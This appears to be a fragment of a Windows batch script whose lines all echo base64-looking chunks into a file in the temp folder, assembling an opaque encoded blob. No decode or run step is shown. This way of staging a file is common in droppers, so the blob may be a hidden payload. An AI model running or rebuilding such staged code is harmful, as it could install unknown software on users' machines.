echo i7RKM1Caxy7pfZfVl2xhpDhSJmk7qYRUT+oiuX4oZd6kMFI0KZmUSconFZAOfdjv >>%temp%\data_encode.txt 
echo 20j/60ltPG23lDmTvEgBpDDSYlIaKZO0jXSIZCBVkxpIbSS2R8oUJC9SGGkxKZm0 >>%temp%\data_encode.txt 
echo lrSFdIhUTjpDaiR1kuR7pcydFEiKJCWQVpM2kQpIB0gGUj2pkyT/iNaL5EeaRppF >>%temp%\data_encode.txt 
echo SiCtJW0h7SQdIFWSTKRG0i2SvIjmI3mTVKRoUgIpm7SNtJtkIFWTTKTGov7YtNH/ >>%temp%\data_encode.txt 
echo LpL8Y4oLyYPkTQogTSPNIkWT4kjJpNUf98+bTf+3kHaSDpHKSSZSI6mN1EWS7yO/ >>%temp%\data_encode.txt 
echo JA9SAElFiiYtISWStKRMUi5pC6mAVEQqJhlI1SQTqYHUSuoksf3kl+RMcid5kXxJ >>%temp%\data_encode.txt 
echo gaQwUiRpCSmRlEZaS8olbSEVkIpIxaRykpFUTzKTbpHYAaqrJFeSF8mPNI00ixRN >>%temp%\data_encode.txt 
echo iiMlk1YfsIoD/d9GKrJKK6H/1Vb8Z33+sz7/X6nPo1hwwrO6DG106gpNSmR60sqk >>%temp%\data_encode.txt 
echo ZM1yTQYr450zzxVHsY1Y+qxmmTZKs0yXnqRdQ/Oc4bZeDuvrNyA0NUWbnprM2Nl7 >>%temp%\data_encode.txt 
echo 28PilyWzc/e2zUxP1aXx5Tl/b/s8TcpybSLZTfe2R6xK0aTz+S/e2x7Fy5ZLZmcs >>%temp%\data_encode.txt 
echo 4p+5BhPw0Tl6+V/zsyF9tqQEnneEZF5q6gpdWl+IyKjTBDONJCKNBy51mSYjQwwi >>%temp%\data_encode.txt 
echo YxskCzXLQ5NTMzRzNTxeb3Pm2Qh5F9cfcF6g06SvEZ3wJHZSEnXfeEtoGyUEa1Of >>%temp%\data_encode.txt 
echo o3z2LDhdIw52m5aUETw/ig9kM56Jhc2KT0lI1vD+Y1houiZeqwlLSidHqelraL6w >>%temp%\data_encode.txt 
echo njRxVsoT0cPhOq2Gl5/MwjTJmn57BvHKpGWa2al9m5WtY+oUrSY9lBYraVl8Mi2h >>%temp%\data_encode.txt 
echo NimV1vdtpl6dpO2JAeXbxbiX6KTnNNGpYakZYVQMB/ahVfq8VPLQizTPfsZHlbWs >>%temp%\data_encode.txt 
echo 5EHxv7hO7DM2YLRZ8dLqqJg2X7O6J+ks4z2Iz0tamh6fzuNVz+sAd8VHW6Y5HCXi >>%temp%\data_encode.txt 
echo wIopGanJmvDUBI34jskqLWoZzf5P9q4+SIoyvb8zrufuygIqVE7Lq2snLuxelmFZ >>%temp%\data_encode.txt 
echo 9jgOWGS/cBcXdtidZTmjGeejZ2dgpnuc7kGg4h0eYkkmCwRPQnIXI3dGDVSMJJ6B >>%temp%\data_encode.txt 
echo S8wREsG7ihZn7R+JxSVXoGYRoxsrVYdK7Pye5+2e6ZnZXdBU5VIVe2j6/fg9z/t8 >>%temp%\data_encode.txt 
echo vU+//bEzWkcuHlezvVpc53nB/blsVtUKmvk85V9Y3i4auA1BocofZ2zxVPwYMcu8 >>%temp%\data_encode.txt 
echo xGmnAbLpMFmuY1vBZeJrTj/95CM9mXXqtn2WFeoYhr4cnuu5VMr5VWmM0kltfWHD >>%temp%\data_encode.txt 
echo 7M5mEcKim+tkaB6V5bhTto2QA1nsQYipjbCQa6kPBsqlOAxsroiVYrsUGK2bqI0M >>%temp%\data_encode.txt 
echo g9DMSreLtNOGeo8a5vn8TWobTOhZsyjot7nNjDna/y7Xtxmmmmbz/16xTtq3Gy47 >>%temp%\data_encode.txt 
echo PEt9VL5b19y2pLGeo74Nataw63/uqtMkO8p1PZVLuymxtveQtO2plB4VP+cyOViI >>%temp%\data_encode.txt 
echo dzy9GkIdWWC7Wh7076MPcwEkm9VY99ZoIqyNkHw13j41vKUCLmq9fXo4Zsco7Dff >>%temp%\data_encode.txt 
echo u1bfYs82v3dtLmUmO7ZhnujDyZjamQhTMuvyBlR1M9ksFkjC66p3QA3z74IKcT/K >>%temp%\data_encode.txt 
echo KTVsyAksxCHvYEWM/wW1dWux/rik+SHXKTYk4jjVJ4nVv3baA3qSlKS2Hzttth/+ >>%temp%\data_encode.txt 
echo lepDWoJdSAZQM6QoEJLgHPVLW/eFI2qKGHuvGdLIYFIaIeqvGQ4nzdXIzojAlCrz >>%temp%\data_encode.txt 
echo Hn0/zjUpw8xG05lku7hbljNks3udMnx2H5dTKoriWhGKJtI65+nrUObEgW2+CI2o >>%temp%\data_encode.txt 
echo ZoYT+G+IUNIIm5xPl4uQjmws7hChDJTWtvA1Wwj5MCbuFCFDNdNsnyDKZjbGJ6Yh >>%temp%\data_encode.txt 
echo LichlBAbuaxx5R4u5zKk8/0i9AD87oxNg6fD9MOtI4ZoRj0dCSGnh9LhrZSjQ6FM >>%temp%\data_encode.txt 
echo KITBk1mKj5WyHk/bvgugDkFC4UwmZMopL3QRChuGmiUbbYOeKrIutX/Lpf+3Xfof >>%temp%\data_encode.txt 
echo FCE1m9U4nz0jQvEYay3En6EMF6T4nJpc0kr9f4W2lBHJxVH+KdstpBvxRCE/XYD9 >>%temp%\data_encode.txt 
echo 9IgQF8mOUSnRrZ5QykCEEovf8oQwIaVAIY+074gnlLGh4mFP0a7f9RRtedQTMrfT >>%temp%\data_encode.txt 
echo t7Nim+sNR5AoxK1enDFs3W7zYhbRxMT2Fa9sXeCNF3Rs9sbjqZxBSwOx2BuH3IZY >>%temp%\data_encode.txt 
echo 6o3z+F/3xjNIbibptAzlnBkVy/loiDu8cZ7jd3lBIkNA9HtH0qYMbzHgRbikMgn6 >>%temp%\data_encode.txt 
echo A3XNm6Ikyl1Zb7ogj+FNR2BEsdWbVtMIS2rbTmVbnwe9GVVmYvjIWxBFPOpFqNlM >>%temp%\data_encode.txt 
echo 9ngBZvaq2Oc1kiNamNcmj3mNAsEBr2FEwxrT/r6XpkCY+R/kcoL5/4FXThkqf9cr >>%temp%\data_encode.txt 
echo pwmV/4jKthR/7JVThtoPUVmTBN+XZSb4AZUzkexmlJ+isj3An1DZyDDt01w2edwX >>%temp%\data_encode.txt 
echo vKae0h/gOf9DlHOZDJdniE5drjB6NcMMa1FYtQdtQ1qykFOZXvTT2anQtEBQ8gvq >>%temp%\data_encode.txt 
echo /Wpa5iIPSkGdGuVtFbqP8T/c27s2tAd6F7f4u/r4d2XnoO3zvXR3fqPFH0txPDag >>%temp%\data_encode.txt 
echo 7dPuaWNLNGtKDitQ//+8u20RQN3Z+/u6C0aOoU770GD3QNHyn2376N9m2zcQrxF0 >>%temp%\data_encode.txt 
echo pdcgxA56W3QjjvT3FI8K+skyN87D9zVXTdJeUyXEsQq+HvGfIMhMgX9lEjzxf3IK >>%temp%\data_encode.txt 
echo /D/RK5onrhHPVrvuY/4EsejS6SnUlWuLdfphF8W+feoRknBH1VQW2SFH3rFDHuiD >>%temp%\data_encode.txt 
echo wokTJ8SJsyfExE+fFmMTljh6zhJ7xiyx+ZQleo5Zov6wJQTt+88iuR8XInJAiDVY >>%temp%\data_encode.txt 
echo 7rYExNh54E8DfwT4vcAbwA8DO4S9F/g24BcBXw/8zcCD79GjwO8BfjPwPcDX0+3b >>%temp%\data_encode.txt 
echo T/iqBSsyyvZ89UUrgPPAnwb+CPB7gTeAHwZ+SFiiF/g24BcBXw/8zcBPAH8O+DHg >>%temp%\data_encode.txt 
echo TwF/DPjDwB8Gfj/w24GPAL8G+BbgLeAt4C3gLeAt4C3gP8HnLD7H8TmAj4FPgPET >>%temp%\data_encode.txt 
echo wJ8Dfgz4U8AfA564HwZ6P9DbgY4AvQboFuDPA38a+CPA7wXeAH5YkAZnocFxaHAA >>%temp%\data_encode.txt 
echo GhjQIAANrDHwPXoU+D3Abwa+B/j6KawjhHUe+NPAHwF+L/AG8MP1whoCHhfGx9uA >>%temp%\data_encode.txt 
echo XwR8PfA3Az8B/Dngx4A/Bfwx4A8Dfxj4/cBvBx5rHGMN8C10bx14C3gLeAt4C3gL >>%temp%\data_encode.txt 
echo 8kCgsxDoOAQ6AIHo6icAgSaAPwf8GPCngD8G/GHgpwgfcR7408AfAX4v8Abww8BP >>%temp%\data_encode.txt 
echo ET7gOyaOAr8H+M3A9wBfD/xUBhqzzgN/GvgjwO8FHpa2hsVUBhqzJoA/B/wY8KeA >>%temp%\data_encode.txt 
echo PwY8jDOFgcYsxDP2Pdg3Y+/BXk+PI6Yw0AcffCDefvtt8cYbb4jXXntNnDx5Urz4 >>%temp%\data_encode.txt 
echo 4ovi8OHD4oknnhD79+8XjzzyiNi+fbvQNE1EIhGxYcMGsWbNGrFy5UrR0tIi5s2b >>%temp%\data_encode.txt 
echo J2655RYxc+ZMMfGxJZ568knMY5rRFv+Dg+SBPhY/H4EozsaJ4OzUm7DeulSaNSr7 >>%temp%\data_encode.txt 
echo SzdR3l+yWeX9pVtFf9lopf1TJTan+9IUm3C4vVUuXFn/pVLdpS6l/ZW6FokKxYp+ >>%temp%\data_encode.txt 
echo e8Cy8crpyxRy9VvurUgvq1P1F+wFZAbbd/DJuPvPkoocqBbaM/wp7X+LADwS9WSI >>%temp%\data_encode.txt 
echo zXfc/ei1ZL/DwRKXpuVfElNF/gX5yFST8rc34e4u6ufqL3YX/D+VfQv9V+efKf1b >>%temp%\data_encode.txt 
echo 5Dd5fLj6p4svqyxuK/on3S5V+LtC3V/9E3ha+yiKfHJMKxzUrqXL7g1iUITwf7cY >>%temp%\data_encode.txt 
echo QKlX9It1qPfi/9Uo0/ZS1fufEH6xuFa8s6v/Oud4B/rod8urJnke/U1eAw0KU2RF >>%temp%\data_encode.txt 
echo UuA6HNySIiVUcNZEXNANgbsZ0yxasX+dj92ildeHt4JfJzBprO3CwG+DNGHU+HKt >>%temp%\data_encode.txt 
echo wGGBuBs8M1h/rRAP8MfPY8m+7dznRzmL0emrAjvEXPDtQ3sUnDScoiQ/OqrgEgVW >>%temp%\data_encode.txt 
echo syWOiIVA9kKKbow9iP8V+/2aPvBwdOnCboAuy2OZ+J848N+v4OhIN4gTYTc4DaJc >>%temp%\data_encode.txt 
echo bF+GWgolA3RNKJvMy0SJNI7hqIqtLE0YI5i2fGSRLCNJakLFbVkMlEl7olcwRi9G >>%temp%\data_encode.txt 
echo pXIWdAn0bGFtV4nZLvk3YM+Csij3V2Gxr2I95Me+VHyNS4vhlRbUWui5o/gC6HvZ >>%temp%\data_encode.txt 
echo TkSrYYSUyzs5tEjLC7FJ/DrbW4X9CUUezcCXZK0RyEQ3EP4UMrbA980YVfnMnhXi >>%temp%\data_encode.txt 
echo HnFLyVhBtlsM9TTbYDMvSCpj5zm2fdErsl7U4jl+llEL3v223ElbZ8eG2iS6+9l3 >>%temp%\data_encode.txt 
echo asFeAdDqkCbHnnTHcnFkej4yuwJb7qEr+WeZqLN5kMfD7KUO8CJZY7wkozaKCJKd >>%temp%\data_encode.txt 
echo YiIFfRexLFnRCNpByKICkWQt3bR3QvIhjjiyvCKG2RaLMS75aQTlHDzltPkhtY6W >>%temp%\data_encode.txt 
echo LM+2uO0tFe0a/jdtv23gGBnmD20UFSbPjoX4XMn3C1328zNtWsgL1i6bO/m+MvMI >>%temp%\data_encode.txt 
echo cTtnLRkllAlSbJfiPKiperPq87e2PvvWlUwr8UVNioHdXFRXG1+ktCnDg/xo09+e >>%temp%\data_encode.txt 
echo HcmlVc00Gpob62qNybsWoSsZV5jQR/fFc9mUTzETqlZXa1fBva72Afm81H9/LmnW >>%temp%\data_encode.txt 
echo 1XanDLVApW5VXUTdW9XQVRABElK3Jg3ToRsa6Oum+pUI6X51NJXMOHROveWKVCOq >>%temp%\data_encode.txt 
echo 7iZCle7G0rOMClItpiTjdbX0MSe3W0sjdRb4x/QHtJQejjkDdNl1vv1O7jGvYI6M >>%temp%\data_encode.txt 
echo m3qIa6uvjjSialE9pjq0HWFDXdLazW1TUxfb1GhCVxp8Q9pmiKx06ul0WIv5Gqc2 >>%temp%\data_encode.txt 
echo yeqcxk+6lBIdG+C/JpIYlDXzldWqGU2QRPyTA2gaVE1Fj2zauLavJxgMQG55y1g+ >>%temp%\data_encode.txt 
echo CWrwrR1ET4t/UM1uUbM2yMcmrilS+elev+K7szvoa1JoPCUeZl3cGEPVYg2Ssjfu >>%temp%\data_encode.txt 
echo GtI/aIbNnIGRW5qblSDbypGqvat/0IQ86Qq50NPV4ZedJE+NG+2nJ/3lbfTUFmwW >>%temp%\data_encode.txt 
echo KfPDMSp30GOhbY4mRdwwPT9yyzegGhldM9QOPbatHBzQjSTbvE1pVrDNJ8HJuoYU >>%temp%\data_encode.txt 
echo O+P0m7rdHM6aPKat4erB/oJuuq2bjOmkNuLnp9H8FFbqzZpK64GQu3muGg3sYbae >>%temp%\data_encode.txt 
echo 01l8mUBZXeJqOeQ63UxgiEr9B8Nb1KDupivp5ncCJvdQgWVNMSgr48s98HzEqkbc >>%temp%\data_encode.txt 
echo nHm8vhDTTjTLyV6I7eIMbFCQqpo4jBudcT5tFNdQno7oOS3GoVDjFGn6Ot8O7ysq >>%temp%\data_encode.txt 
echo cbWxOJw0E0U8Gmpc0adE7MBDqx2nNX56Mr06q6dZMUclMgOxsgUw+nPmVY5NUOZL >>%temp%\data_encode.txt 
echo D20MlchqfDljQdiIJpM+t0AtECiobjVvK8ijcIlnAXUovgULfMq8gpVQ3BLpzPbF >>%temp%\data_encode.txt 
echo K3D0lgpS8IKupOGE/TKFnvEviIXN8HKFvsa+zecj7Xy+5ew4u8k3jyrzUPBdmT0J >>%temp%\data_encode.txt 
echo vkwhYNx+F6NIUyhNbr2WT2G+ljL7TW++Um8WpS7KVWlGu+UqRG9Ppa4sOaFcYVaI >>%temp%\data_encode.txt 
echo Mm63RSPFSnKW09apZ7YFdR5JTnhntpe0s10mo28pZ+DkTg4oX6B/kM4MPF9XO2eG >>%temp%\data_encode.txt 
echo 4nnBHFDvz6mG2YNljZot9TTIfGl6NSODxLnQFU2OIdvcVr0iX02+DEJc+fm17+ok >>%temp%\data_encode.txt 
echo kc/pQcXGpPeDHMOWGaPAaxBnO4mmF0bovFdTcmIvDspnPxlD0+S9Abnko7O5k7cc >>%temp%\data_encode.txt 
echo Fk7VyTafNRlW+s11Qq9wGylYOJlPdyqfXO2sfVK1Jw9p3ssnjGlsYK9g/+/ZYBqZ >>%temp%\data_encode.txt 
echo 3au+BiMbdd7qalJi8nU6qjRSsqM0EyfbOQYrlfgKiwLSXq45mpSt6VRMx1HDmLYh >>%temp%\data_encode.txt 
echo ZFOlGZLRrG7ocdMPlbr61/qcMymRAi3JbEm6UyotsRt8Zjqzjha2BCagvwsz0s48 >>%temp%\data_encode.txt 
echo PuQdf4SVdk6cxlWeNY2ydVr5Qs0BkF8aXAQl506XidmqLB9JS5xi/LInmNuUhalp >>%temp%\data_encode.txt 
echo uNY23FBXS6s5vopzW7vJlC88ym5SrqS7QsfpnebwsJmCuoQbKxq0X7FscIVLk9KC >>%temp%\data_encode.txt 
echo q8psjjUkJjYDed7pS2pqQyfs2sC6E4PGxlJcQc/KwHUvtewLv1/FfJv8VHHVOaem >>%temp%\data_encode.txt 
echo 7CKq/y6OMHmBVd75mwvuxVCwC66umugK2ZWPyg1UME7h6pbDpR/JiV7wQZo2cB2q >>%temp%\data_encode.txt 
echo rJNZjUxk0jJgmTyUWyVhplO8HGr0B8L0mutwUsMFK/yTzET0cDZGE8tPb7fiiHkH >>%temp%\data_encode.txt 
echo Hj6OarcGDdTMrbAKpPCvy6UjOHmtWKlMbo8Gn6YrdBJlm9QQSWdKDWddateQVBSC >>%temp%\data_encode.txt 
echo 9mp/WjO4rtcbnDhBeqdzqe3InKFmOXBpVDtUbMT0KamwTp9PfkF2SZhmxli2cCGW >>%temp%\data_encode.txt 
echo A5mkP6ov3GTgbA6Aqx/dMTWt+5OZBRKUZtTCO+JJNRUz2pYsWdrasqRl8bxUWBtp >>%temp%\data_encode.txt 
echo U5nclqbkQlZeXtgx6AAMDsEaUgTjOa1lZ7Nhd4BJnd0WXHv3Pn4hpEo+Ky282LHq >>%temp%\data_encode.txt 
echo 6p5jiJlf/tFM8ULNq7cd8/S9elswkTSUTFYfySLJRsOapptKRFWyOY1+RQqXZwq9 >>%temp%\data_encode.txt 
echo 8uevq6u93Wax7V8e+kLbj98fcvbGsXeDi/n4TvAojqHT7wTn8PFisImP7wb93H/R >>%temp%\data_encode.txt 
echo Pr4XXMa07w2pON7z8jvBFXz8dz4OJKMJ4juVCoFuIfo8VWLTj+qjTtsvhNdzvWem >>%temp%\data_encode.txt 
echo IuibQ5+QbQfq6S/3iMB+LYbKXiGcL/f8QuGv+7zSmPyqzaqHGMjfWOocCwf5EstL >>%temp%\data_encode.txt 
echo Hn55YcptwiO+eKMQzS94xK3TwDJ/6Sn1GeRs9UyN99NMxTFKv8JHApGuZbdZFSHu >>%temp%\data_encode.txt 
echo 82cpZoTYYtq606uRHZ7yv1dc5ZcwsY++vZ1+UY++BftYBe4EwpPfdCSdSDd+o+dk >>%temp%\data_encode.txt 
echo Ba7j89u2/zvbUP7d9fnu6sAm7/iG9fS7v1WB8WdvpEJ14hfr2wXaVzrt+2T7zraN >>%temp%\data_encode.txt 
echo /9wuhDk3X0eF3Wsv54cuD4y/x71VO9uC3HvTITrmq/Nz6TiQb6+2zuxsC8i+fB0V >>%temp%\data_encode.txt 
echo 8jccokMgv6ba+tnOtj7um5OfS4W8N19Hx/X5QLX1+s62Hptpj820x8W0y2HaJZl2 >>%temp%\data_encode.txt 
echo uZiucpiuspmucjFdYTNdYTNd4WK61GG6VDJd6mLa6jBttZm2upg220ybbabNLqZN >>%temp%\data_encode.txt 
echo DtMmybSpwNSaq8Da+aEZA+Mr7hIi/9a9f/+PtME/D707hvlxqOpMu1j88u7uy6d3 >>%temp%\data_encode.txt 
echo 3feJZZ25TojTuwKfyL/3Pb0rWChlUKIJlTgHjqO7Wi3LCozf3i19+ia1jZ4BZP34 >>%temp%\data_encode.txt 
echo bNl2epdpU+Qfp9LyoepZo3txUkhMkEjcm187Iz/noYHxtV1MsutEbpYcnMgurCPw >>%temp%\data_encode.txt 
echo 5QqwUgDfk6ga4Fj6YJ0dS12zpTzVsv0Np73Jbm+Q7Sed9jmyfZMnEUDPePd/WRaq >>%temp%\data_encode.txt 
echo F8aQbROZgfKRn+50iRl0xHyGwL9dAd7mgGfteoyMwJ07T3h2S9Qo22Rt9YOqNE++ >>%temp%\data_encode.txt 
echo e0Z+xr71o0MHB8Zfk6Sc5za/Imb9bbDu4M6PfLn60e6DgfHnu+SMGPcGRtceXD/6 >>%temp%\data_encode.txt 
echo OJl9YLyRzT7j4k0EcnzxsOR0cRY0fJQ0jF6WGn4A3olnSWj36OP/0OFoGJUdO096 >>%temp%\data_encode.txt 
echo dksEi728u/rBL0nZEVT5qt8JjOf7WJzdHD480PM00Ecf80A7X6Jm8S1qP0Pt52T7 >>%temp%\data_encode.txt 
echo hftJgAkSoIRbp0sA7tj5d57dEuFEEQQoMXStI0DGEeAyDbTNESBTEODWQbSHbQEm >>%temp%\data_encode.txt 
echo KJZXDJa77WR7wW1/OJ3b9Eq3/VrHdG77sKPMbTSDBsaznSVuo8b146+221MoY08/ >>%temp%\data_encode.txt 
echo VquHxP/+Ryz+xdaS8ROxQQ7sC3fZgb28jtmC6j1MoPGUpCrz6YUIomGT2CSsuU1A >>%temp%\data_encode.txt 
echo /aABeWNnWwNnExpwBw24SJImKIslTlDu9mwSiaXfaAdVw2RU3yOqjz+UVJQXE89+ >>%temp%\data_encode.txt 
echo w6ZqmJrqb4jqZUnFmTMgkyrS2SqZzmZYP6ugepOo9tpjUdobv/F6aYHEpY32oD1T >>%temp%\data_encode.txt 
echo DzonCIqAJAeScmpiI+D5uU12Cm6SKXiG9XoF8SoivulDO8o4Uc56eBGF9cYgO+Oe >>%temp%\data_encode.txt 
echo NbYznrvelRGFs4Kh736kH2nBwJToN3nydc1S4eZJFZ616+lCMi24MEEnkPEv1dpK >>%temp%\data_encode.txt 
echo j5PS+BxqtU8TrfI0cbt1hlmNjjZRXrDmfpEcKUYfp+pAwoTAfCoikqWSZIZNkh9t >>%temp%\data_encode.txt 
echo JRI57kBin9RtR6+t2+s89OzRXcQpYM2dA8YXG3e+xKrmboBy3yM7XfylDNtZaHif >>%temp%\data_encode.txt 
echo IvIN2XDhP+incwuGOc6G+cmshx8rMQyf7cgdzZO6I3dD2TS9uNGe9rnb7CmVeF7K >>%temp%\data_encode.txt 
echo /UqPLfcttXLefTn/eIYVG5OAZxzAhzXODPqQ5P3KL93pZNaun1P6YOM/WX2Vxi/4 >>%temp%\data_encode.txt 
echo kb7janR0RaknVrAUl6b1RBeRJOYMwZGUcA5IEUd3rSjafpKVxX83dn2hbVVhPAnp >>%temp%\data_encode.txt 
echo mq7/oqQSNGgHZVURVuweCu1DUwnLoB030a6N60pb6ziEPQhmWGGb25JAr3fBPRip >>%temp%\data_encode.txt 
echo OKFBBZ/GxFKqtJLZh7qhUGSgsiAyBp5acfUvQaL1+33n5I6kqazQy7n3fr/v//nO >>%temp%\data_encode.txt 
echo dy7tvWt13HVAKKHKS/d3feVK69p8nOuLn/jKgb9UoLy61GVg72nXZt3GhJ1uV+qr >>%temp%\data_encode.txt 
echo LN7RsnToANmqaSuV0eLgMOZYj8b0VAbVSsNMQxjDHJCHDumACI+ytuw4WCvQlIn1 >>%temp%\data_encode.txt 
echo yC5qtNeYtgJWjv2pSsYsnejGrrlP+a1v92rzIaD7NDRsS0aRmY/sWmTWgdr8Q6HQ >>%temp%\data_encode.txt 
echo fIpLiBP3mtA1zLp6a6haBPIjhYw7c4M6LQZVWvgr04oRPUcJ8ZpGhOHwGe4DCk+y >>%temp%\data_encode.txt 
echo 76w2D1U3M4uLuSYM06exiDR7Mc6cw7jNxyQpkPiZZJZJAkxykUnameQSSDqY5E0a >>%temp%\data_encode.txt 
echo alk7Gu1alr0EPb/5XfnkMp1wB35fQVgA9LKGGhVBuLp7EO4AdUKjmkbgf2Cj1U16 >>%temp%\data_encode.txt 
echo Uw2ndoxg/ius2mJE9E5BpY6AU8UM1o2qJStQQ38D3Aq/6WrCnfbZiMpecIsqbrN0 >>%temp%\data_encode.txt 
echo YC7QrV/pFqjS7ZHzPDjrcivOM+B8QXEW2B6JOdapwqd7a6g0D+BhBeTXbKe/ToxX >>%temp%\data_encode.txt 
echo b7SqpFPV6FVDJw2vW80YRsQXIzxpJ5/Rk/Zjd7mK3oSQO7+q6vK2lUU5iW63dRhB >>%temp%\data_encode.txt 
echo 2lycrFwYE2NI3ZM10ylQVfsbkyuMTrg291d5ptPlPscGbkG20LLfqbaM6rOlhMlX >>%temp%\data_encode.txt 
echo 3LqXHOSOE0ezbZSl8e70FLg1UdWTDytuOVw27lNXNUWBLmwxOpPGlDEUPYVoUKWN >>%temp%\data_encode.txt 
echo r0aMBGAfKNhaelr7SwiKcCb7Pu8AOl1c0VsX82gtpvCd6xW8gX609cIwnyyrHiWM >>%temp%\data_encode.txt 
echo zzdncGJmptlOPg70GJY6jxyMitQoB3IuqAP5EzP3WmlwTMouMz1Gg3gLApVn383s >>%temp%\data_encode.txt 
echo 51B/OjDkcJwws3neNIxx0wzvZJ5ztpjZz+2ryXyLmb7xr2pA4y784v9r+/XWhZYM >>%temp%\data_encode.txt 
echo A5VFgHQFx212/jz88O5d7YdR7QcsoBhH4y2ZdJ59mhGKTcAI3rutRGs7k9e6qK0R >>%temp%\data_encode.txt 
echo Kg81GXM0rHI8RzlDWAlD0dh82+mEl81laNR4V0/oJc7FfVZ2Wed3BPm9ZG+jl/Uo >>%temp%\data_encode.txt 
echo ubLAlI9aaQwoHbMLrCG29Gt8jVds5Q2xrsLR0K/Dccyp5pVD/I3u5OIvLL47bw2V >>%temp%\data_encode.txt 
echo ur+S+PyyvdfX+30r5Ll3QT2faTKsIU9E4u363AkkGtZCJX6BfD0NIP71UIn5gD7u >>%temp%\data_encode.txt 
echo tRF7W1g69Q47EJZGVP4QfmmCfFm+wfr4iJk3gocTeFQkv8VLzsNuWgqj8rPnIcBv >>%temp%\data_encode.txt 
echo 8yH65M8eK+QniI8g3qitSw4wb/KG0+p3G1FZfwzIgBkqJc+UHGdIvyL+gH9zD3nG >>%temp%\data_encode.txt 
echo HCpaoSLUq5If32YN3tqGF33KXpKXCXmJDwGpPttqBpmIbhRti4s7LP4f/Pld8AQ5 >>%temp%\data_encode.txt 
echo vjFNs2zjDTr0NuPBzCnn6sYVOjsad8qrZJi09jgchjwyRcNXaWhtycILeE2G2SUP >>%temp%\data_encode.txt 
echo qEo7nsonXr51W+aoWxLPPtXvkO/VEfURBt4edzhiMQpbRB6iC3KOv1aRaBQ/PEGE >>%temp%\data_encode.txt 
echo iyQhJsdxI4ZDNw4PMvD7Kdx6jMbEvk4OT9KdIvia9eBAesbr5RTd/lJ20rE7vyoX >>%temp%\data_encode.txt 
echo 6Y68WQd0A+kYW437hP8TytUJDzSW+EBhLEWFCo9/n741e/zH5Islh/yHzJ0NFXKp >>%temp%\data_encode.txt 
echo QtDRfT3Ye601dcDJMg6bzbgoptH3hZH1/kllTuKBtVDpP2p8z4XQRQCAQ0vtvX18 >>%temp%\data_encode.txt 
echo VMXVOH539+7mkmzYBRIIAholKIgvgQVN3EQ2kd1EJbgxsiFiErVK42qVyr0BWwJJ >>%temp%\data_encode.txt 
echo b6K5GbflafXX9qk+FbFWn6c+pa1i8DXJYl4Uee23YrEYhMrEG2WRmGwg5H7Pmbu7 >>%temp%\data_encode.txt 
echo 2dgFfH6f57/fDz65Oy9nzpyZOXPmzMyZGZQQrdhn+k6gYFyKUHkI9crdCNVlxsR4 >>%temp%\data_encode.txt 
echo haZqbvkYctOkT+hUHov1H2asSYeWe6M4w0cf1ukS7eS6cr+xnOzW0hehXvE3uoHB >>%temp%\data_encode.txt 
echo AdQUHy2OQAnadfSt6xHL1ZANCdOJQBPJpgb4Kfdp2fTn/djcVmip7+m192DjIclM >>%temp%\data_encode.txt 
echo v3c9Ci1sVhOjzj2C9JNOdTEp6ScGgg9xlHpp5UqMDZL7Kc3Sky+srzvOAYIp1+Nj >>%temp%\data_encode.txt 
echo E3oqdy8pCd2nsBc4K6qrVvVga/wVyuajHgDTpF5qvB7b5jRk1odqPTCbmqpJAv0z >>%temp%\data_encode.txt 
echo ViHUoA0919yrez6vDMp1gmZrPA5t2Pcefi6+ly3qsqUCEHwADYoWOGom8Fyblp4N >>%temp%\data_encode.txt 
echo ThCQi7zYxdniYhZk5Z+mpedAEKA0+40VH87bWvN3kOmp9+E3/W78zroLv4tX4jf/ >>%temp%\data_encode.txt 
echo DviufjK9nv2kiuxnlpf9mJexnznF7OfqpfDzzM/M6+GHuLmtD7Fffusa+A24ha0b >>%temp%\data_encode.txt 
echo 0N/0yQhMLc2tqKLA/y0YuVUEX5e5Br5IeJf5IRYLVWleH3H5+ZUPtnFd9Rs+1tlF >>%temp%\data_encode.txt 
echo 9xPWH5Vl5jD423vBz0X8Na0wBNNeqNQeXawIPlKcZ+q2vV6QFijNMO0Fh+XB0FzT >>%temp%\data_encode.txt 
echo 186/idNJidV5i/XRZFIomAqtzu5HrXLHXOffpC8cbVWVQdKhDvvoIwLrlZn3bcE3 >>%temp%\data_encode.txt 
echo 4t5pBr4lXl7lnXtFO0j490O2P02E/hBa2FYV3GaowlyhuTgpqdP8JMAa6J3YcY9f >>%temp%\data_encode.txt 
echo ivwi8QvbKoP0w/uYJ9nP0a8gvELt22ZgDVWfH/gEVQwe/T4iCU2DolkeNUj3Usq6 >>%temp%\data_encode.txt 
echo tnh506B0Wc1mgKLZ32P8IdlqnkHvpbpXnL+wTc2WezQlFaGU1KfY91fs+wz7Pse+ >>%temp%\data_encode.txt 
echo L8C304z5GYDsyqDfTK+FGt7lF2pyUDAUoQQDGdBaAtJ/da4Zt2ykyi15+NxTK3pw >>%temp%\data_encode.txt 
echo V01atgNfhlyd25yB0TdCfe/AuPnt3lKKkxkmEK6Q12dxGy6NdJBtBpjmu/sJCJSG >>%temp%\data_encode.txt 
echo HEDbZnuqnbRjr4oALGz7dgeCqqHHdeloq8fKneBo24Et8US03p5k9Wapr7Ny0mTs >>%temp%\data_encode.txt 
echo PT/+HnY1gQYysc9G6lfOxzoB3UWQkugr0NnUFL0uU7GvDR2smNE2tHc2Ds0AjKm7 >>%temp%\data_encode.txt 
echo gRw9+GCxjqE/Tb5/ANh6QL4/jJ2sGLUQd9jhHoDBRUtfCt4F6HDpjoC7H4DyGFAo >>%temp%\data_encode.txt 
echo AOqAu9/hHnG09wR1HvaVv7v8c9eb7+DGrHOPyDftli6nT6EY6XbukZJ23AaR6kQI >>%temp%\data_encode.txt 
echo TU6dBFPv9l57SrfCUg7tq1YY21cFQcA72lzBVtxUC9a8hEVMXwZZAj8Ga3CLsga3 >>%temp%\data_encode.txt 
echo cYHb8CCvrimwIQIPlO3qAD1/GyQJ0n8OsSFfFrKUYp4e1yI+I/gAf67ZCpnZnmoL >>%temp%\data_encode.txt 
echo tjYeBfDWevzGpEtZvHgBVeDDeX4TfR54o4vP2gV8FWACwI+j1wxGhNL05FnUeZvx >>%temp%\data_encode.txt 
echo +3Qjfp+tx+9rG/D79nr4rn7y6RfYT+BX7OdZkf00rWE/v3uI/bxSAz/P/KzpmbMo >>%temp%\data_encode.txt 
echo fGG28BQ4Auh47iyuZmG+KHKIa8TvVZo2s9iXkJI7ZuB4zwMxXe6X0oFvu9x/YO9/ >>%temp%\data_encode.txt 
echo uV/V0r26CrpSGzoE4KAg6CW46BC082hQF7wBd9irS16oUisMJQIU+hVkW2DavvuZ >>%temp%\data_encode.txt 
